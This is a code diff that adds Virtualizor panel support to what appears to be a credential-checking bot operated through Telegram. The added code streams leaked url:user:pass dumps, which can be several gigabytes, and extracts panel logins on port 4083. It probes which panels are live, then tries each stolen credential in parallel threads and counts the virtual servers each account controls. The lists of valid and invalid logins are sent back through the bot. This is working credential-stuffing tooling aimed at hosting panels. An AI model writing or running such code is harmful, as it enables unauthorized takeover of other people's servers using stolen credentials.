@@ -2204,6 +2204,189 @@ def vps_login(entry):
             time.sleep(1)                           # retry: fresh attempt after 1s
     return "error", note
 
+# ── Virtualizor (/vps_virtl, /vps_verify): same streamed scan as the proxmox one ──
+
+VIRTL_PANL = ":4083"
+# The dump mixes real panel lines with junk, so the regex stays strict on the
+# port and the credential shape, but the host part stays permissive.
+VIRTL_LINE = re.compile(
+    r"(https?://[^\s:]+:\d{1,5}(?:/[^\s:]*)?):([^/:\s]{1,64}):([^\s]{1,80})")
+VIRTL_HOST = re.compile(
+    r"^([a-zA-Z0-9.\-]+:\d{1,5})(?:/[^\s:]*)?:([^/:\s]{1,64}):([^\s]{1,80})")
+VIRTL_SPACE = re.compile(
+    r"^(?:panel\s+)?([a-zA-Z0-9.\-]+:\d{1,5})\s+([^\s:/]{1,64})\s+([^\s]{1,80})$")
+VIRTL_UA = "Mozilla/5.0 (Virtualizor checker)"
+VIRTL_TUNE = 64          # reachability threads
+VIRTL_CHECKS = 50        # login-check threads
+VIRTL_RETRY = 2          # extra attempts for network errors
+
+
+def virtl_parse_line(line):
+    """Return (url, user, pass) for one virtualizer line, or None.
+
+    Mirrors the Go ParseVPSEntries fallback chain so the same dump lines are
+    picked up by both engines."""
+    m = VIRTL_LINE.search(line)
+    if m:
+        host, u, p = m.group(1).strip(), m.group(2).strip(), m.group(3).strip()
+    else:
+        host = u = p = ""
+        for rx in (VIRTL_SPACE, VIRTL_HOST):
+            m2 = rx.search(line)
+            if m2:
+                host, u, p = m2.group(1).strip(), m2.group(2).strip(), m2.group(3).strip()
+                break
+        if not host:
+            parts = line.split(":")
+            if len(parts) >= 4:
+                p = parts[-1].strip()
+                u = parts[-2].strip()
+                host = ":".join(parts[:-2]).strip()
+    if not host or not u or not p:
+        return None
+    if not host.lower().startswith(("http://", "https://")):
+        host = "https://" + host
+    if VIRTL_PANL not in host:
+        return None
+    return host, u, p
+
+
+def virtl_hits(path):
+    """Streamed panel scan — the file is read line by line, so a 3.9 GB dump is
+    scanned with a few MB of RAM. Zip archives are unpacked and every inner file
+    is scanned the same way."""
+    with open(path, "rb") as fh:
+        magic = fh.read(4)
+    files = [str(path)]
+    if magic == b"PK\x03\x04":
+        exd = WORK / "virtlun"
+        try:
+            shutil.rmtree(exd, ignore_errors=True)
+            exd.mkdir(parents=True)
+            with zipfile.ZipFile(path) as z:
+                z.extractall(exd)
+            files = [os.path.join(root, fn)
+                     for root, _d, fns in os.walk(str(exd)) for fn in sorted(fns)]
+        except Exception:
+            files = [str(path)]
+    seen, hits = set(), []
+    anchor = VIRTL_PANL.encode()
+    for fp in files:
+        try:
+            fh = open(fp, "rb")
+        except Exception:
+            continue
+        with fh:
+            n = 0
+            for raw in fh:
+                n += 1
+                if n % 5_000_000 == 0:
+                    tick("scan", 96, msg="filtering the virtualizer lines (streamed)…",
+                         scanned=n, found=len(hits))
+                if anchor not in raw:
+                    continue
+                line = raw.decode("utf-8", "ignore")
+                got = virtl_parse_line(line)
+                if not got:
+                    continue
+                key = (got[0], got[1], got[2])
+                if key in seen:
+                    continue
+                seen.add(key)
+                hits.append(key)
+    return hits
+
+
+def virtl_probe(entry):
+    """('ok'|'invalid'|'dead', note) — is the panel up and really Virtualizor?"""
+    url, user, pwd = entry
+    endpoint = url.rstrip("/") + "/index.php?api=json&act=login"
+    try:
+        r = requests.get(endpoint, timeout=8, verify=False, allow_redirects=True,
+                         headers={"User-Agent": VIRTL_UA})
+    except Exception as e:
+        return "dead", type(e).__name__
+    if r.status_code >= 500:
+        return "dead", "HTTP %s" % r.status_code
+    body = (r.text or "")[:20000]
+    server = (r.headers.get("Server") or "").lower()
+    try:
+        pk = ((r.json() or {}).get("pubkey") or "")
+    except Exception:
+        pk = ""
+    if "virtualizor" in server or "BEGIN PUBLIC KEY" in pk:
+        return "ok", "HTTP %s" % r.status_code
+    low = body.lower()
+    if "virtualizor" in low or "webvirt" in low:
+        return "ok", "HTTP %s" % r.status_code
+    return "invalid", "HTTP %s" % r.status_code
+
+
+def virtl_login(entry):
+    """('valid'|'bad'|'error', note, vps_count) — logs into one panel."""
+    url, user, pwd = entry
+    endpoint = url.rstrip("/") + "/index.php?api=json&act=login"
+    note = "no attempt"
+    for attempt in range(1 + VIRTL_RETRY):
+        pubkey = ""
+        try:
+            r = requests.get(endpoint, timeout=10, verify=False,
+                             headers={"User-Agent": VIRTL_UA})
+            try:
+                pubkey = ((r.json() or {}).get("pubkey") or "")
+            except Exception:
+                pubkey = ""
+        except Exception as e:
+            note = "%s: %s" % (type(e).__name__, str(e)[:60])
+            if attempt < VIRTL_RETRY:
+                time.sleep(1)
+            continue
+        try:
+            payload = {"username": user, "password": pwd, "login": "1"}
+            r = requests.post(endpoint, timeout=12, verify=False, data=payload,
+                               headers={"User-Agent": VIRTL_UA,
+                                        "X-Requested-With": "XMLHttpRequest"})
+        except Exception as e:
+            note = "%s: %s" % (type(e).__name__, str(e)[:60])
+            if attempt < VIRTL_RETRY:
+                time.sleep(1)
+            continue
+        if r.status_code >= 500:
+            note = "HTTP %s" % r.status_code
+            if attempt < VIRTL_RETRY:
+                time.sleep(1)
+            continue
+        try:
+            d = r.json() or {}
+        except Exception:
+            return "error", "unparseable response", 0
+        if d.get("error"):
+            err = d.get("error")
+            if isinstance(err, list):
+                err = "; ".join(str(x) for x in err)
+            return "bad", str(err)[:80], 0
+        if d.get("uid") or d.get("username") is not None or d.get("email") is not None:
+            return "valid", "", virtl_count_vps(url)
+    return "error", note, 0
+
+
+def virtl_count_vps(base_url):
+    """How many virtual servers the account can see."""
+    endpoint = base_url.rstrip("/") + "/index.php?api=json&act=vps"
+    try:
+        r = requests.get(endpoint, timeout=10, verify=False,
+                         headers={"User-Agent": VIRTL_UA})
+        if r.status_code >= 500:
+            return 0
+        d = r.json() or {}
+    except Exception:
+        return 0
+    vps = d.get("vps")
+    if isinstance(vps, list):
+        return len(vps)
+    return 0
+
+
 def tg_pull(fid, path):
     """Download a Telegram document with the injected BOT_TOKEN."""
     r = requests.get(TG_API + "getFile", params={"file_id": fid}, timeout=30)
@@ -2328,6 +2511,118 @@ def process_vps(task):
                       % (len(valid), len(bad), len(err)))
         finish(task, "done", total=len(entries), valid=len(valid),
                bad=len(bad), errors=len(err), sent=1 if sent else 0)
+        return
+
+    if kind == "vps_virtl":
+        if task.get("url"):
+            arc = download(task["url"])
+            if arc is None:
+                finish(task, "error", err=_state.get("err") or "download failed")
+                return
+            path = str(arc)
+        elif task.get("file_id"):
+            path = tg_pull(task["file_id"], str(WORK / "virtl_src.dat"))
+        else:
+            finish(task, "error", err="no source — send an ulp link or a file"); return
+        st("scan", 96, msg="filtering the virtualizer lines (streamed)…", file=Path(path).name)
+        hits = virtl_hits(path)
+        if not hits:
+            finish(task, "error", err="no virtualizer url:user:pass lines in the source")
+            return
+        st("vps_probe", 2, total=len(hits), ok=0, invalid=0, dead=0)
+        ok, inval, dead = [], [], []
+        done = [0]
+        def _probe(e):
+            res = virtl_probe(e)
+            done[0] += 1
+            (ok if res[0] == "ok" else inval if res[0] == "invalid" else dead).append((e, res[1]))
+            tick("vps_probe", _vps_pct(done[0], len(hits)),
+                 total=len(hits), ok=len(ok), invalid=len(inval), dead=len(dead),
+                 threads=VIRTL_TUNE,
+                 speed="%0.1f/s" % (done[0] / max(0.5, time.time() - t0)),
+                 eta=ft((time.time() - t0) / max(1, done[0]) * (len(hits) - done[0])),
+                 elapsed=ft(time.time() - t0))
+        with ThreadPoolExecutor(max_workers=VIRTL_TUNE) as ex:
+            list(ex.map(_probe, hits))
+        if stop():
+            finish(task, "cancelled"); return
+        rf = OUT / "vps_virtl_results.txt"
+        with open(rf, "w", encoding="utf-8", errors="ignore") as fh:
+            fh.write("=== VPS VIRTUALIZER SCAN — SUMMARY ===\n"
+                     "Extracted   : %d\n"
+                     "Reachable   : %d\n"
+                     "Not Virtualizor : %d\n"
+                     "Dead        : %d\n"
+                     "Date        : %s\n\n"
+                     "=== REACHABLE ===\n%s\n"
+                     "=== NOT VIRTUALIZOR ===\n%s\n"
+                     "=== DEAD / UNREACHABLE ===\n%s\n" % (
+                         len(hits), len(ok), len(inval), len(dead),
+                         time.strftime("%Y-%m-%d %H:%M:%S"),
+                         "".join("%s:%s:%s\n" % e for (e, _n) in ok),
+                         "".join("%s:%s:%s  (%s)\n" % (e[0], e[1], e[2], n)
+                                 for (e, n) in inval),
+                         "".join("%s:%s:%s  (%s)\n" % (e[0], e[1], e[2], n)
+                                 for (e, n) in dead)))
+        st("vps_pack", 99, total=len(hits), ok=len(ok))
+        sent = upload(str(rf),
+                      "VPS VIRTUALIZER — reachable %s/%s panels" % (len(ok), len(hits)))
+        finish(task, "done", total=len(hits), reach=len(ok),
+               invalid=len(inval), unreach=len(dead), sent=1 if sent else 0)
+        return
+
+    if kind == "vps_verify":
+        if task.get("url"):
+            arc = download(task["url"])
+            if arc is None:
+                finish(task, "error", err=_state.get("err") or "download failed")
+                return
+            path = str(arc)
+        elif task.get("file_id"):
+            path = tg_pull(task["file_id"], str(WORK / "virtl_verify_src.dat"))
+        else:
+            finish(task, "error", err="no source — send a results link or a file"); return
+        st("scan", 96, msg="filtering the virtualizer lines (streamed)…", file=Path(path).name)
+        entries = virtl_hits(path)
+        if not entries:
+            finish(task, "error", err="no virtualizer url:user:pass lines in that file")
+            return
+        st("vps_login", 2, total=len(entries), valid=0, bad=0, errors=0)
+        valid, bad, errl = [], [], []
+        done = [0]
+        def _check(e):
+            res = virtl_login(e)
+            done[0] += 1
+            (valid if res[0] == "valid" else bad if res[0] == "bad" else errl).append((e, res[1], res[2]))
+            tick("vps_login", _vps_pct(done[0], len(entries)),
+                 total=len(entries), valid=len(valid), bad=len(bad), errors=len(errl),
+                 threads=VIRTL_CHECKS,
+                 speed="%0.1f/s" % (done[0] / max(0.5, time.time() - t0)),
+                 eta=ft((time.time() - t0) / max(1, done[0]) * (len(entries) - done[0])),
+                 elapsed=ft(time.time() - t0))
+        with ThreadPoolExecutor(max_workers=VIRTL_CHECKS) as ex:
+            list(ex.map(_check, entries))
+        if stop():
+            finish(task, "cancelled"); return
+        rp = OUT / "vps_verify_results.txt"
+        withvps = [x for x in valid if x[2] > 0]
+        rp.write_text(
+            "=== VPS VIRTUALIZER VERIFY — SUMMARY ===\n"
+            "Entries : %d\nValid   : %d\nValid+VPS: %d\nBad     : %d\nErrors  : %d\n"
+            "Date    : %s\n\n=== VALID OK ===\n%s\n=== VALID WITH VPS (>0) ===\n%s\n"
+            "=== BAD ===\n%s\n=== ERROR ===\n%s\n" % (
+                len(entries), len(valid), len(withvps), len(bad), len(errl),
+                time.strftime("%Y-%m-%d %H:%M:%S"),
+                "".join("%s:%s:%s  (vps=%d)\n" % (e[0], e[1], e[2], v) for (e, _n, v) in valid),
+                "".join("%s:%s:%s  (vps=%d)\n" % (e[0], e[1], e[2], v) for (e, _n, v) in withvps),
+                "".join("%s:%s:%s  (%s)\n" % (e[0], e[1], e[2], n) for (e, n, _v) in bad),
+                "".join("%s:%s:%s  (%s)\n" % (e[0], e[1], e[2], n) for (e, n, _v) in errl)))
+        st("vps_pack", 99, total=len(entries), valid=len(valid))
+        sent = upload(str(rp),
+                      "VPS VIRTUALIZER VERIFY — valid %s / bad %s / errors %s"
+                      % (len(valid), len(bad), len(errl)))
+        finish(task, "done", total=len(entries), valid=len(valid),
+               bad=len(bad), errors=len(errl), sent=1 if sent else 0)
         return
 
     finish(task, "error", err="unknown vps kind %r" % kind)
@@ -2546,7 +2841,7 @@ def main():
         task = json.loads(os.environ.get("TASK") or "{}")
     except Exception:
         task = {}
-    if task.get("kind") in ("vps_promox", "vps_check"):
+    if task.get("kind") in ("vps_promox", "vps_check", "vps_virtl", "vps_verify"):
         process_vps(task)
         return
     if not task.get("url"):
